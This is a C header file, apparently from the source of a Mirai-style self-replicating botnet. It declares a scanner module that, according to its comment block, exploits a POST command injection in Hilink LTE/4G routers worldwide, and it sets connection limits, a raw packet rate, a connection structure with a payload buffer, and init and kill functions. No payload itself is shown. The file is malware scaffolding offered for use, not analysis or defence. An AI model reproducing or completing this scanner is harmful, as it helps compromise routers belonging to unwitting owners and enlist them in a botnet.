#ifdef SELFREP

/* ============================================================================
 * HILINK SCANNER - LTE/4G Router Exploitation (Port 80)
 * ============================================================================
 * Exploit: Hilink LTE router command injection via device/control
 * Targets: Hilink LTE/4G routers globally
 * Method: POST command injection
 * Regions: All regions with Hilink equipment
 * ============================================================================ */

#pragma once

#include <stdint.h>
#include "includes.h"

#define HILINK_SCANNER_MAX_CONNS 128
#define HILINK_SCANNER_RAW_PPS 64

struct hilink_scanner_connection {
    int fd;
    ipv4_t dst_addr;
    uint16_t dst_port;
    uint8_t state;
    time_t last_recv;
    char rdbuf[2048];
    int rdbuf_pos;
    char payload_buf[2048];
};

void hilink_scanner_init(void);
void hilink_kill(void);

#endif
